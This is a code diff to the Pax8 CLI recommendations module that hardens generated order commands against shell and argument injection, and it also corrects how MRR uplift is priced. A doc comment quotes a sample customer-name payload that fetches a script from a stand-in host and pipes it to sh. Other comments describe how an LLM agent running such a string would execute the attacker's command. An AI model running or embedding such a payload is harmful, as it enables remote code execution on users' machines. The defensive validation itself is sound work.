@@ -11,13 +11,12 @@
  * Network & Communications Commissioned). The CLI over-decomposes Security
  * into 4 categories and omits Communications, Network, and Operations
  * entirely. This was a deliberate simplification for the local recommendations
- * engine's security-focused cross-sell heuristic. When OE's first-party
- * recommendations API ships (ARC-785, `GET /opportunities`), this local
+ * engine's security-focused cross-sell heuristic. When Pax8's first-party
+ * Opportunity Explorer API ships (`GET /opportunities`), this local
  * taxonomy sunsets. Pax8's STAX taxonomy is itself being replaced by a new
- * L1/L2/L3 hierarchical taxonomy (PCM team, Angelo Echtermeijer) — the CLI
- * should align to whichever taxonomy the OE API uses at sunset time. See:
- * Product Category (STAX) Layout, Product Taxonomy & Ontology PRD, and the
- * v0.2 follow-up issue (#375).
+ * L1/L2/L3 hierarchical product-category model — the CLI
+ * should align to whichever taxonomy the upstream API uses at sunset time.
+ * See the v0.2 follow-up issue (#375).
  *
  * Separately from product categories, the `opportunityType` field on
  * `Recommendation` carries OE's canonical 5-type opportunity taxonomy
@@ -35,6 +34,86 @@
 
 import type { Subscription } from "../api/types.js";
 import { subscriptionMrr } from "./analytics.js";
+
+// ─── orderCommand safety ────────────────────────────────────────────────────
+// The `orderCommand` string is the agent-facing handle to a recommendation —
+// CLAUDE.md and skill.md both document the "extract orderCommand from
+// recommendations list --json and run it" pattern, so the agent ends up
+// being the unintentional executor of whatever value we interpolate here.
+//
+// Previously the constructed string was:
+//   `pax8 orders create --company "${companyName}" --product ${productId} --quantity ${qty}`
+//
+// A `companyName` containing a literal `"` (or a name an upstream attacker
+// or a compromised tenant directory entry could set) broke out of the
+// double-quoted frame. The REPL tokenizer (`packages/cli/src/lib/repl.ts`)
+// then re-parses the string into argv and `spawn`s `node` with the
+// resulting array, which Commander dispatches with the *attacker-controlled*
+// `--product` / `--quantity` overrides. The internal spawn is array-form
+// (safe from OS shell injection) — what's at risk is Commander argument
+// injection at the agent → REPL → orders create boundary.
+//
+// Fix: interpolate the `companyId` (a stable identifier with a strict
+// character set) instead of the display name. We then validate every
+// interpolated field as a "safe identifier" before composing the string;
+// any field that fails validation produces `orderCommand: null` so an
+// agent never gets a string it can't trust verbatim. Safe-identifier
+// covers both Pax8 UUIDs (`a1b2c3d4-…`) and the `prod-…` test/demo IDs
+// without admitting whitespace, quotes, or shell metacharacters.
+const SAFE_ID_RE = /^[A-Za-z0-9_-]{1,128}$/;
+
+function isSafeId(value: string | null | undefined): value is string {
+  return typeof value === "string" && SAFE_ID_RE.test(value);
+}
+
+// Display names contain real-world punctuation: spaces, apostrophes,
+// periods, ampersands (`AT&T`, `Procter & Gamble`, `Johnson & Johnson`),
+// and occasionally `;` / `|` / `<` / `>` (rare but legitimate). What they
+// MUST NOT contain is any character that breaks out of `--company
+// "${companyName}"` in `buildOrderArtifacts`'s display string — that
+// frame, plus a `bash -c '<orderCommand>'` evaluation, is what shell
+// consumers see.
+//
+// Inside double-quoted shell strings, the only chars that break out are:
+//   `"`        closes the double-quoted span
+//   `\`        backslash escapes — could neutralize the closing quote
+//   `` ` ``    backtick command substitution
+//   `$`        `$VAR` / `$(...)` substitution
+//   `\n` / `\r` literal newline ends the line
+//   `\x00`     NUL (defensive)
+//
+// `;` `|` `&` `<` `>` are NOT special inside double quotes — they're
+// literal text. The original H-2 gate also blocked those, but #509
+// migrated the in-process consumers (REPL, recommendations act,
+// recommendations list, dashboard) off the string form onto the
+// spawn-safe `orderArgs` argv array, so the only remaining string-form
+// consumer is an external agent shell-pasting `orderCommand` from
+// `--json` output. That use case is shell-safe as long as the
+// double-quote frame survives, so the gate can be narrowed to the chars
+// that actually break the frame.
+//
+// Net effect: partners with legitimate `&`-containing display names
+// (`AT&T` and friends) now produce non-null `orderCommand` /
+// `orderArgs`, where before they collapsed to null. The argv form was
+// always safe; the string form is now safe too.
+//
+// If you ever need to widen this: weigh the consumer audience. An
+// internal consumer that re-tokenizes via a non-shell tokenizer (an
+// agent that splits on whitespace ignoring quotes) is not the shell's
+// problem to defend — that consumer should switch to `orderArgs`.
+// eslint-disable-next-line no-control-regex -- \x00 is the intentional target: NUL in a display name should collapse to null.
+const UNSAFE_DISPLAY_CHARS_RE = /["\\`$\n\r\x00]/;
+
+function isSafeDisplayName(value: string | null | undefined): value is string {
+  return typeof value === "string"
+    && value.length > 0
+    && value.length < 256
+    && !UNSAFE_DISPLAY_CHARS_RE.test(value);
+}
+
+function isSafeQuantity(value: number | null | undefined): value is number {
+  return typeof value === "number" && Number.isInteger(value) && value > 0 && value < 1_000_000;
+}
 
 // ─── Product Categories ─────────────────────────────────────────────────────
 // Maps keyword patterns in product names to categories.
@@ -94,6 +173,22 @@ export const ALL_CATEGORIES: ProductCategory[] = [
   "backup",
   "cloud_infrastructure",
 ];
+
+/**
+ * Short human labels for each product category, used to build the
+ * `rationaleSnippet` on every Recommendation. Kept intentionally short
+ * (≤ ~20 chars) so the snippet fits in the `recommendations list`
+ * table column between the title and the uplift. #655 / UXR F5.
+ */
+const CATEGORY_SHORT_LABEL: Record<ProductCategory, string> = {
+  productivity: "productivity",
+  email: "email",
+  security: "security",
+  endpoint_protection: "endpoint protection",
+  identity: "identity/MFA",
+  backup: "backup",
+  cloud_infrastructure: "cloud",
+};
 
 export function categorizeProduct(productName: string): ProductCategory[] {
   const categories: ProductCategory[] = [];
@@ -260,11 +355,12 @@ type SubscriptionInput = Omit<Partial<Subscription>, "status" | "billingTerm"> &
 
 /**
  * Pax8 Opportunity Explorer's canonical 5-type opportunity taxonomy.
- * Source: OX Help Center. Added as an additive axis on every recommendation
- * alongside the legacy `type` field, per the disclosure-over-rewrite pattern
- * from #298/#299. The full taxonomy alignment (CLI 7 product categories vs
- * STAX / PCM canon) is deferred to v0.2 (#375); this axis is the in-tree
- * portion of that alignment that can ship without waiting on ARC-785.
+ * Added as an additive axis on every recommendation alongside the legacy
+ * `type` field, per the disclosure-over-rewrite pattern from #298/#299.
+ * The full taxonomy alignment (CLI 7 product categories vs Pax8's canonical
+ * product-category model) is deferred to v0.2 (#375); this axis is the
+ * in-tree portion of that alignment that can ship without waiting on the
+ * first-party Opportunity Explorer API.
  */
 export type OpportunityType =
   | "Upsell"
@@ -286,9 +382,44 @@ export interface Recommendation {
   priority: "high" | "medium" | "low";
   title: string;
   reason: string;
+  /**
+   * Short "at-a-glance why" — customer-specific quantitative anchor when
+   * available (e.g. `"30/150 backup"`), categorical when not
+   * (e.g. `"no backup"`, `"no active subs"`). Kept ≤ ~20 chars so it
+   * fits in the `recommendations list` table between the title and the
+   * uplift column. #655 / UXR F5. See also the full `reason` above for
+   * the paragraph-length explanation surfaced by `recommendations why`.
+   */
+  rationaleSnippet: string;
   suggestedProducts: string[];
-  /** The exact CLI command to execute this recommendation */
+  /**
+   * The exact CLI command to execute this recommendation.
+   *
+   * Informational / display-only. The string is built by interpolating the
+   * upstream-controlled `companyName` (a value the partner-tenant owner could
+   * influence via the customer record) into a shell template. It is safe to
+   * print, but unsafe to hand to a shell verbatim — a malicious customer
+   * name like `Acme" $(curl evil/x|sh) "` produces a working shell payload
+   * once a user (or an LLM tool-using agent) pastes it into `bash -c`.
+   *
+   * Programmatic execution paths MUST use `orderArgs` instead. See #462.
+   */
   orderCommand: string | null;
+  /**
+   * The same order as `orderCommand`, pre-tokenized as an argv-style array.
+   * Safe to hand to `spawn()`/`execFile()`/the REPL tokenizer without any
+   * shell involvement: the customer name (and any other interpolated value)
+   * lands as a single argv element, so shell metacharacters cannot escape
+   * out of it.
+   *
+   * `null` when `orderCommand` is `null` (no orderable product matched).
+   * The first element is always the `pax8` argv0 so the array can be
+   * dropped into `spawn("node", [cliPath, ...orderArgs.slice(1)])`.
+   *
+   * Prefer this field over `orderCommand` for any caller that intends to
+   * execute the recommendation. See #462.
+   */
+  orderArgs: string[] | null;
   /** Whether the recommended product is available and orderable in the Pax8 catalog */
   productAvailable: boolean;
   /** Current MRR for this company */
@@ -372,9 +503,80 @@ export function getPortfolioCoverage(
   return result;
 }
 
+// UUID-shape detector — the Pax8 API returns RFC-4122 UUIDs for company IDs.
+// We use this to decide whether `companyId` is preferable to `companyName`
+// for the `--company` value in the displayed `orderCommand` string. The
+// argv form (`orderArgs`) always includes the name as a single argv element,
+// so the safety story does not depend on this — but a UUID in the display
+// string is one less surface that has to survive a copy-paste through a
+// not-quite-careful shell.
+const UUID_SHAPE_RE = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i;
+
+/**
+ * Build the `orderCommand` display string and the matching `orderArgs`
+ * argv-style array for an order-create recommendation.
+ *
+ * Display contract (`orderCommand`):
+ *   - When `companyId` looks like a UUID, prefer it over `companyName` —
+ *     UUIDs are inert under shell evaluation, and using one closes the
+ *     `Acme" $(...) "`-style injection vector at the display layer too.
+ *   - Otherwise (demo mode, legacy IDs that aren't UUIDs), fall back to
+ *     `"${companyName}"`. The string is informational only — callers that
+ *     intend to *execute* should use `orderArgs`. See #462.
+ *
+ * Argv contract (`orderArgs`):
+ *   - First element is always `"pax8"` so the array can be dropped into a
+ *     spawn() call or the REPL tokenizer verbatim.
+ *   - The customer name lands as a single argv element regardless of which
+ *     shell metacharacters it contains — no quoting, no escaping, no shell.
+ *   - `--company` value carries the same identifier (UUID if available,
+ *     else the name) as the display string, so the two forms stay in sync.
+ */
+function buildOrderArtifacts(
+  companyId: string,
+  companyName: string,
+  productId: string,
+  quantity: number,
+): { orderCommand: string; orderArgs: string[] } {
+  const useUuid = UUID_SHAPE_RE.test(companyId);
+  const companyToken = useUuid ? companyId : companyName;
+  // Display string: when we use the UUID, it's bare (no quotes); when we
+  // fall back to the name, wrap in double quotes so a single-word display
+  // still parses as one --company value if a user does paste it. The
+  // safety story does not rely on this quoting — `orderArgs` is the
+  // safe path.
+  const companyDisplay = useUuid ? companyToken : `"${companyToken}"`;
+  const orderCommand = `pax8 orders create --company ${companyDisplay} --product ${productId} --quantity ${quantity}`;
+  const orderArgs = [
+    "pax8",
+    "orders",
+    "create",
+    "--company",
+    companyToken,
+    "--product",
+    productId,
+    "--quantity",
+    String(quantity),
+  ];
+  return { orderCommand, orderArgs };
+}
+
 export function getRecommendations(
   subscriptions: SubscriptionInput[],
-  products?: Array<{ id: string; name: string; vendorName?: string; pricing?: Array<{ billingTerm: string; suggestedRetailPrice: number }> }>,
+  // `partnerBuyRate` is optional so existing embedders that only pass
+  // `suggestedRetailPrice` keep compiling — but uplift is documented as
+  // additional *Pax8 cost*, so the buy rate is what it should be priced at
+  // when available. See the fallback in the price map below.
+  products?: Array<{
+    id: string;
+    name: string;
+    vendorName?: string;
+    pricing?: Array<{
+      billingTerm: string;
+      suggestedRetailPrice: number;
+      partnerBuyRate?: number;
+    }>;
+  }>,
   companies?: Array<{ id: string; name: string }>,
 ): RecommendationReport {
   // Group subscriptions by company
@@ -388,12 +590,28 @@ export function getRecommendations(
 
   // Build product price lookup for MRR uplift estimates
   // Source 1: product catalog pricing (if available)
-  const productPriceMap = new Map<string, number>();
+  //
+  // The billing term rides along with the price: a One-Time or Trial SKU
+  // must not be amortised as recurring. Before #710 this map held bare
+  // numbers and uplift was `price × seats` regardless of term, so a
+  // $5,000 one-time onboarding SKU across 39 seats reported $195,000/mo
+  // of recurring uplift — 110x the entire portfolio's monthly cost.
+  const productPriceMap = new Map<string, { price: number; billingTerm: string }>();
   if (products) {
     for (const p of products) {
       const monthlyRate = p.pricing?.find((r) => r.billingTerm === "Monthly");
       if (monthlyRate) {
-        productPriceMap.set(p.name.toLowerCase(), monthlyRate.suggestedRetailPrice);
+        // partnerBuyRate, not suggestedRetailPrice. `estimatedMrrUplift` is
+        // documented as *additional Pax8 cost* — what the partner would pay
+        // Pax8 — so pricing it at retail overstated every opportunity and
+        // put it on a different basis from the cost rollups it sits beside
+        // in `dashboard` and `today`.
+        productPriceMap.set(p.name.toLowerCase(), {
+          // Falls back to retail only when the caller didn't supply a buy
+          // rate; the figure is then retail and overstates Pax8 cost.
+          price: monthlyRate.partnerBuyRate ?? monthlyRate.suggestedRetailPrice,
+          billingTerm: "Monthly",
+        });
       }
     }
   }
@@ -403,7 +621,7 @@ export function getRecommendations(
     const name = (sub.productName ?? "").toLowerCase();
     const price = sub.price ?? 0;
     if (name && price > 0 && !productPriceMap.has(name)) {
-      productPriceMap.set(name, price);
+      productPriceMap.set(name, { price, billingTerm: sub.billingTerm ?? "Monthly" });
     }
   }
 
@@ -460,9 +678,11 @@ export function getRecommendations(
         let estimatedMrrUplift: number | null = null;
         const suggestedName = rule.suggestedProducts[0];
         if (suggestedName) {
-          const price = productPriceMap.get(suggestedName.toLowerCase());
-          if (price) {
-            estimatedMrrUplift = price * primaryQty;
+          const entry = productPriceMap.get(suggestedName.toLowerCase());
+          if (entry) {
+            // Via subscriptionMrr so One-Time / Trial / Activation contribute
+            // 0 rather than being counted as recurring (#710).
+            estimatedMrrUplift = subscriptionMrr(entry.price, primaryQty, entry.billingTerm);
           }
         }
 
@@ -500,9 +720,13 @@ export function getRecommendations(
 
         // If initial price lookup failed but we resolved a real product name, retry lookup
         if (!estimatedMrrUplift && resolvedProductName) {
-          const resolvedPrice = productPriceMap.get(resolvedProductName.toLowerCase());
-          if (resolvedPrice) {
-            estimatedMrrUplift = resolvedPrice * primaryQty;
+          const resolvedEntry = productPriceMap.get(resolvedProductName.toLowerCase());
+          if (resolvedEntry) {
+            estimatedMrrUplift = subscriptionMrr(
+              resolvedEntry.price,
+              primaryQty,
+              resolvedEntry.billingTerm,
+            );
           }
         }
 
@@ -510,9 +734,32 @@ export function getRecommendations(
         if (!productAvailable && suggestedName) {
           unmatchedProducts.add(suggestedName);
         }
-        const orderCommand = matchedProductId
-          ? `pax8 orders create --company "${companyName}" --product ${matchedProductId} --quantity ${primaryQty}`
-          : null;
+        // #462 + H-2: emit both an informational display string and a
+        // safe argv array (#498's buildOrderArtifacts). Callers (REPL,
+        // recommendations act, Claude skill) must execute via `orderArgs`
+        // so an upstream-controlled customer name can never break out
+        // into a shell substitution.
+        //
+        // We additionally gate the call on SAFE_ID_RE / isSafeQuantity
+        // (#506) so that hostile values for `companyId`, `matchedProductId`,
+        // or `primaryQty` collapse both forms to null. This is the
+        // load-bearing control until `repl.ts`, `recommendations/list.ts`,
+        // `recommendations/act.ts`, and `dashboard.ts` migrate from
+        // tokenizing `orderCommand` to consuming `orderArgs` directly —
+        // tracked as a follow-up. Until then, `buildOrderArtifacts` may
+        // fall back to `--company "${companyName}"` (when companyId is
+        // not UUID-shaped), and a hostile name inside that quote frame
+        // would break the REPL tokenizer.
+        const artifacts =
+          matchedProductId &&
+          isSafeId(companyId) &&
+          isSafeId(matchedProductId) &&
+          isSafeQuantity(primaryQty) &&
+          isSafeDisplayName(companyName)
+            ? buildOrderArtifacts(companyId, companyName, matchedProductId, primaryQty)
+            : null;
+        const orderCommand = artifacts?.orderCommand ?? null;
+        const orderArgs = artifacts?.orderArgs ?? null;
 
         // Demote to medium priority when the product isn't available/orderable
         const effectivePriority: "high" | "medium" | "low" = productAvailable
@@ -537,8 +784,10 @@ export function getRecommendations(
           priority: effectivePriority,
           title,
           reason: rule.reason,
+          rationaleSnippet: `no ${CATEGORY_SHORT_LABEL[rule.butMissing]}`,
           suggestedProducts: [resolvedProductName, ...rule.suggestedProducts.slice(1)],
           orderCommand,
+          orderArgs,
           productAvailable,
           currentMrr: Number(currentMrr.toFixed(2)),
           estimatedMrrUplift: estimatedMrrUplift !== null ? Number(estimatedMrrUplift.toFixed(2)) : null,
@@ -551,13 +800,25 @@ export function getRecommendations(
     // Check seat gaps
     const gaps = findSeatGaps(subs);
     for (const gap of gaps) {
-      const price = productPriceMap.get(gap.gapProduct.toLowerCase());
-      const estimatedMrrUplift = price ? price * gap.missingSeats : null;
-
-      // For seat gaps, use the product ID directly from the subscription
-      const orderCommand = gap.gapProductId
-        ? `pax8 orders create --company "${companyName}" --product ${gap.gapProductId} --quantity ${gap.missingSeats}`
+      const gapPrice = productPriceMap.get(gap.gapProduct.toLowerCase());
+      const estimatedMrrUplift = gapPrice
+        ? subscriptionMrr(gapPrice.price, gap.missingSeats, gapPrice.billingTerm)
         : null;
+
+      // For seat gaps, use the product ID directly from the subscription.
+      // See buildOrderArtifacts (#462) for the shell-injection rationale
+      // and the cross-sell branch above for the SAFE_ID_RE gate (#506).
+      // Same gate applied here for symmetry.
+      const seatArtifacts =
+        gap.gapProductId &&
+        isSafeId(companyId) &&
+        isSafeId(gap.gapProductId) &&
+        isSafeQuantity(gap.missingSeats) &&
+        isSafeDisplayName(companyName)
+          ? buildOrderArtifacts(companyId, companyName, gap.gapProductId, gap.missingSeats)
+          : null;
+      const orderCommand = seatArtifacts?.orderCommand ?? null;
+      const orderArgs = seatArtifacts?.orderArgs ?? null;
 
       recommendations.push({
         companyId,
@@ -574,8 +835,10 @@ export function getRecommendations(
         // heuristic is cross-product mismatch coverage. See #298.
         title: `${gap.missingSeats} mismatched seats: ${gap.gapProduct} (${gap.gapQuantity}/${gap.baseQuantity})`,
         reason: `${gap.baseProduct} covers ${gap.baseQuantity} seats but ${gap.gapProduct} only covers ${gap.gapQuantity}. ${gap.missingSeats} seats are unprotected.`,
+        rationaleSnippet: `${gap.gapQuantity}/${gap.baseQuantity} ${CATEGORY_SHORT_LABEL[gap.category]}`,
         suggestedProducts: [gap.gapProduct],
         orderCommand,
+        orderArgs,
         productAvailable: true, // seat gaps reference products already in use
         currentMrr: Number(currentMrr.toFixed(2)),
         estimatedMrrUplift: estimatedMrrUplift !== null ? Number(estimatedMrrUplift.toFixed(2)) : null,
@@ -606,8 +869,10 @@ export function getRecommendations(
           priority: "high",
           title: `No active subscriptions for ${company.name}`,
           reason: "This customer has no active subscriptions. Consider reaching out to discuss their needs.",
+          rationaleSnippet: "no active subs",
           suggestedProducts: [],
           orderCommand: null,
+          orderArgs: null,
           productAvailable: false,
           currentMrr: 0,
           estimatedMrrUplift: null,
